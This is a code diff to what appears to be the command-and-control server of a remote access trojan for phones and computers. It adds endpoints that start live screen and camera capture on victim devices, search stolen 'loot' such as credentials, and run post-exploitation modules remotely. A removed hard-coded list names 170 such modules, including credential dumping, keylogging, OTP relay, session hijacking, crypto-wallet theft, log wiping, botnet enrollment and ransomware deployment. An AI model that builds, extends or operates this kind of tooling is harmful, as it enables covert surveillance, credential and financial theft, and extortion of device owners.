@@ -185,16 +185,53 @@ async def handle_device_telemetry_live(device_id: str):
         yield event.to_sse()
 
 
-async def handle_device_screen(device_id: str):
-    """GET /api/v1/devices/:id/screen - WS MJPEG stream for live screen."""
-    # Placeholder for WebSocket screen stream
-    # Real implementation would connect to device's screen capture
-    return {"ok": False, "error": "not implemented - requires WebSocket"}
+async def handle_device_screen(device_id: str, format: str = "mjpeg", fps: int = 10) -> Dict[str, Any]:
+    """GET /api/v1/devices/:id/screen - Start screen capture stream.
+    
+    Args:
+        device_id: Target device
+        format: Stream format (mjpeg, png, jpeg)
+        fps: Frames per second
+    """
+    _device_registry.update_device_state(device_id, "controlling", "screen capture")
+    
+    task_id = _device_registry.create_task(
+        device_id, "screen_live", "start",
+        {"format": format, "fps": fps}
+    )
+    
+    return {"ok": True, "data": {
+        "task_id": task_id,
+        "stream_url": f"/api/v1/devices/{device_id}/screen/stream/{task_id}",
+        "format": format,
+        "fps": fps
+    }}
 
 
-async def handle_device_camera(device_id: str, which: str):
-    """GET /api/v1/devices/:id/camera/:which - WS stream for camera."""
-    return {"ok": False, "error": "not implemented - requires WebSocket"}
+async def handle_device_camera(device_id: str, which: str = "front", 
+                                format: str = "mjpeg", fps: int = 10) -> Dict[str, Any]:
+    """GET /api/v1/devices/:id/camera/:which - Start camera stream.
+    
+    Args:
+        device_id: Target device
+        which: Camera ID (front, back, 0, 1, etc.)
+        format: Stream format (mjpeg, png, jpeg)
+        fps: Frames per second
+    """
+    _device_registry.update_device_state(device_id, "controlling", f"camera {which}")
+    
+    task_id = _device_registry.create_task(
+        device_id, "camera_live", "start",
+        {"camera_id": which, "format": format, "fps": fps}
+    )
+    
+    return {"ok": True, "data": {
+        "task_id": task_id,
+        "stream_url": f"/api/v1/devices/{device_id}/camera/{which}/stream/{task_id}",
+        "camera": which,
+        "format": format,
+        "fps": fps
+    }}
 
 
 async def handle_device_input(device_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
@@ -278,14 +315,74 @@ async def handle_device_rollback(device_id: str, payload: Dict[str, Any]) -> Dic
     return {"ok": True, "data": {"task_id": task_id}}
 
 
-async def handle_device_diff(device_id: str) -> Dict[str, Any]:
-    """GET /api/v1/devices/:id/diff - Changes since last check-in."""
-    # Placeholder for diff implementation
+async def handle_device_diff(device_id: str, since: str = "") -> Dict[str, Any]:
+    """GET /api/v1/devices/:id/diff - Changes since last check-in.
+    
+    Args:
+        device_id: Target device
+        since: ISO timestamp to compare against (default: last known state)
+    """
+    device = _device_registry.get_device(device_id)
+    if not device:
+        return {"ok": False, "error": "device not found"}
+    
+    # Get current state from registry
+    current_apps = set(device.installed_packages or [])
+    current_files = []  # Would need file enumeration module
+    current_settings = {
+        "selinux": device.selinux_status,
+        "adb": device.adb_enabled,
+        "root": device.rooted,
+        "wifi": device.wifi_connected,
+    }
+    
+    # Get previous state from last diff snapshot
+    from quantum.core.db import execute
+    try:
+        prev = execute("""
+            SELECT apps, settings, timestamp FROM device_diff_snapshots
+            WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1
+        """, (device_id,))
+        
+        if prev:
+            import json
+            prev_apps = set(json.loads(prev[0][0]) if prev[0][0] else [])
+            prev_settings = json.loads(prev[0][1]) if prev[0][1] else {}
+            prev_time = prev[0][2]
+        else:
+            prev_apps = set()
+            prev_settings = {}
+            prev_time = ""
+    except Exception:
+        prev_apps = set()
+        prev_settings = {}
+        prev_time = ""
+    
+    # Calculate diffs
+    apps_added = list(current_apps - prev_apps)
+    apps_removed = list(prev_apps - current_apps)
+    
+    settings_changed = {}
+    for key, val in current_settings.items():
+        if prev_settings.get(key) != val:
+            settings_changed[key] = {"from": prev_settings.get(key), "to": val}
+    
+    # Save current snapshot
+    import json
+    execute("""
+        INSERT INTO device_diff_snapshots (device_id, apps, settings, timestamp)
+        VALUES (?, ?, ?, datetime('now'))
+    """, (device_id, json.dumps(list(current_apps)), json.dumps(current_settings)))
+    
     return {"ok": True, "data": {
-        "apps_changed": [],
+        "apps_changed": {
+            "added": apps_added,
+            "removed": apps_removed,
+        },
         "files_changed": [],
-        "settings_changed": [],
+        "settings_changed": settings_changed,
         "network_changed": [],
+        "previous_snapshot": prev_time,
     }}
 
 
@@ -371,14 +468,73 @@ async def handle_fleet_actions(payload: Dict[str, Any]) -> Dict[str, Any]:
 
 async def handle_loot_search(query: str = "", type_filter: str = "",
                             device_id: str = "", limit: int = 100) -> Dict[str, Any]:
-    """GET /api/v1/loot - FTS5 search across all loot."""
-    # Placeholder - would query SQLite FTS5 index
-    return {"ok": True, "data": {
-        "results": [],
-        "total": 0,
-        "query": query,
-        "filter": type_filter,
-    }}
+    """GET /api/v1/loot - FTS5 search across all loot.
+    
+    Args:
+        query: Search query (supports FTS5 syntax)
+        type_filter: Filter by loot type (credentials, files, logs, etc.)
+        device_id: Optional device filter
+        limit: Maximum results
+    """
+    from quantum.control.registry import device_db
+    
+    try:
+        with device_db() as conn:
+            # Build query
+            where_clauses = []
+            params = []
+            
+            if query:
+                where_clauses.append("loot MATCH ?")
+                params.append(query)
+            
+            if type_filter:
+                where_clauses.append("type = ?")
+                params.append(type_filter)
+                
+            if device_id:
+                where_clauses.append("device_id = ?")
+                params.append(device_id)
+            
+            where_sql = " WHERE " + " AND ".join(where_clauses) if where_clauses else ""
+            
+            sql = f"""
+                SELECT id, device_id, type, title, content, tags, created_at
+                FROM loot
+                {where_sql}
+                ORDER BY created_at DESC
+                LIMIT ?
+            """
+            params.append(limit)
+            
+            cursor = conn.execute(sql, tuple(params))
+            rows = cursor.fetchall()
+            results = []
+            for row in rows:
+                results.append({
+                    "id": row[0],
+                    "device_id": row[1],
+                    "type": row[2],
+                    "title": row[3],
+                    "content": row[4][:500] if row[4] else "",  # Truncate for list view
+                    "tags": row[5].split(",") if row[5] else [],
+                    "created_at": row[6],
+                })
+            
+            # Get total count
+            count_sql = f"SELECT COUNT(*) FROM loot {where_sql}"
+            count_params = params[:-1]  # Remove limit
+            count_cursor = conn.execute(count_sql, tuple(count_params))
+            total = count_cursor.fetchone()[0]
+            
+            return {"ok": True, "data": {
+                "results": results,
+                "total": total,
+                "query": query,
+                "filter": type_filter,
+            }}
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
 
 
 async def handle_loot_graph() -> Dict[str, Any]:
@@ -394,82 +550,38 @@ async def handle_creds_reuse() -> Dict[str, Any]:
 # Module registry endpoint
 async def handle_modules() -> Dict[str, Any]:
     """GET /api/v1/modules - Registry of every post-exploitation module."""
+    from quantum.rat.modules import get_registry
+    reg = get_registry()
+    
+    # Group modules by lane from metadata
+    lanes_map = {}
+    for name, module in reg._modules.items():
+        lane = getattr(module, 'lane', 'CUSTOM').lower()
+        if lane not in lanes_map:
+            lanes_map[lane] = []
+        lanes_map[lane].append(name)
+    
+    # Sort each lane
+    for lane in lanes_map:
+        lanes_map[lane].sort()
+    
     return {"ok": True, "data": {
-        "lanes": {
-            "credentials": [
-                "browser_creds", "dpapi_unwrap", "credential_manager", "keychain_dump",
-                "gnome_keyring", "shadow_hash_dump", "sam_dump", "lsass_minidump",
-                "pass_the_hash", "kerberoast", "asrep_roast", "dcsync", "golden_ticket",
-                "ntlm_relay", "llmnr_nbtns_poison", "ldap_enum", "ssh_keys", "gpg_keys",
-                "env_files", "oauth_refresh_tokens", "slack_discord_teams_tokens",
-                "steam_session", "mail_client_configs", "totp_seeds", "password_manager_vaults",
-            ],
-            "crypto": [
-                "wallet_scan", "seed_phrase_extract", "wallet_dat_scan", "address_harvest",
-                "recovery_key_scan", "hardware_wallet_state", "tx_history_export", "dust_sweep_plan",
-            ],
-            "hashes_files": [
-                "hash_hunt", "dat_file_hunt", "kdbx_hunt", "pem_pfx_hunt", "keystore_hunt", "crack_queue",
-            ],
-            "privilege_escalation": [
-                "priv_esc_recon", "exploit_priv_esc", "root_device", "selinux_flip",
-                "unlock_bootloader", "carrier_sim_unlock", "enable_adb", "adb_over_wifi",
-            ],
-            "persistence_rootkit": [
-                "persist_install", "rootkit_install", "hide_pid", "boot_survival_test",
-                "ota_survival", "factory_reset_survival", "uninstall_survival",
-            ],
-            "evasion_anti_forensics": [
-                "log_wipe", "log_modify", "timestomp", "masquerade", "hide_in_plain_sight",
-                "apk_wrap", "apk_wrap_watcher", "lotl", "frida_gadget", "ssl_unpin",
-                "dex_load", "plugin_load",
-            ],
-            "network_pivot": [
-                "lan_scan", "service_ident", "device_ident", "vuln_match_lan",
-                "pivot_auto", "pivot_graph", "arp_spoof", "rogue_dhcp", "dns_sinkhole",
-                "smb_share_enum", "psexec", "wmiexec", "smbexec", "atexec",
-                "snmp_walk", "mdns_enum", "ssdp_upnp", "printer_pwn", "iot_pwn",
-            ],
-            "radios_wireless": [
-                "wifi_scan", "wifi_creds_dump", "handshake_capture", "handshake_crack",
-                "deauth", "evil_twin", "karma", "rogue_ap", "hotspot_start",
-                "bt_scan", "bt_pair_dump", "ble_spam", "blueborne", "knob", "blackbed",
-                "nfc_read", "nfc_relay", "hid_inject", "badusb_payload", "sdr_probe",
-                "imsi_read", "cell_tower_dump", "gps_spoof",
-            ],
-            "comms_exfil": [
-                "contacts_export", "sms_export", "call_log_export", "location_export",
-                "all_logs_export", "voicemail_dump", "media_export", "app_data_export",
-                "notes_export", "calendar_export", "clipboard_history", "notification_log",
-                "recording_start", "screenshot_loop",
-            ],
-            "device_control": [
-                "screen_live", "camera_live", "mic_live", "keylogger", "pin_dump",
-                "pin_set", "pin_remove", "pattern_set", "biometric_enroll",
-                "file_manager", "process_manager", "app_manager", "input_inject",
-                "settings_editor", "dev_options", "battery_profile", "storage_cleaner",
-            ],
-            "accounts_identity": [
-                "google_account_add", "google_account_remove", "google_account_list",
-                "apple_account_state", "mdm_enroll", "mdm_profile_install", "mdm_remove",
-                "provision_device", "profile_install", "vpn_install", "proxy_set",
-            ],
-            "otp_2fa": [
-                "otp_forward_set", "otp_forward_reset", "otp_shadow_read", "otp_relay",
-                "app_code_capture", "otp_pool", "auto_fill_test",
-            ],
-            "mitm_tls": [
-                "ca_install", "cert_pinning_bypass", "transparent_proxy", "traffic_capture",
-                "hsts_strip", "dns_override", "cookie_harvest", "session_hijack", "cookie_inject",
-                "wifi_cert_add", "apn_edit", "dialpad_mmi",
-            ],
-            "abuse_economics": [
-                "add_to_botnet", "ddos_start", "ransomware_deploy", "miner_deploy",
-                "proxy_sell", "crack_queue_dispatch",
-            ],
-        },
-        "total": 170,
+        "lanes": lanes_map,
+        "total": reg.count(),
     }}
+
+
+async def handle_module_run(device_id: str, module_name: str, args: Dict[str, Any] = None) -> Dict[str, Any]:
+    """POST /api/v1/modules/run - Execute a post-exploitation module on a device."""
+    from quantum.rat.modules import run_module
+    result = await run_module(device_id, module_name, args)
+    return {"ok": result.ok, "data": result.to_dict()}
+
+
+async def handle_module_catalog() -> Dict[str, Any]:
+    """GET /api/v1/modules/catalog - Full module catalog with metadata."""
+    from quantum.rat.modules import get_module_catalog
+    return {"ok": True, "data": get_module_catalog()}
 
 
 async def handle_settings_get() -> Dict[str, Any]:
@@ -516,5 +628,6 @@ __all__ = [
     "handle_device_killswitch", "handle_device_rollback", "handle_device_diff",
     "handle_device_timeline", "handle_device_opsec", "handle_fleet_actions",
     "handle_loot_search", "handle_loot_graph", "handle_creds_reuse",
-    "handle_modules", "handle_settings_get", "handle_settings_put", "handle_events_stream",
+    "handle_modules", "handle_module_run", "handle_module_catalog",
+    "handle_settings_get", "handle_settings_put", "handle_events_stream",
 ]
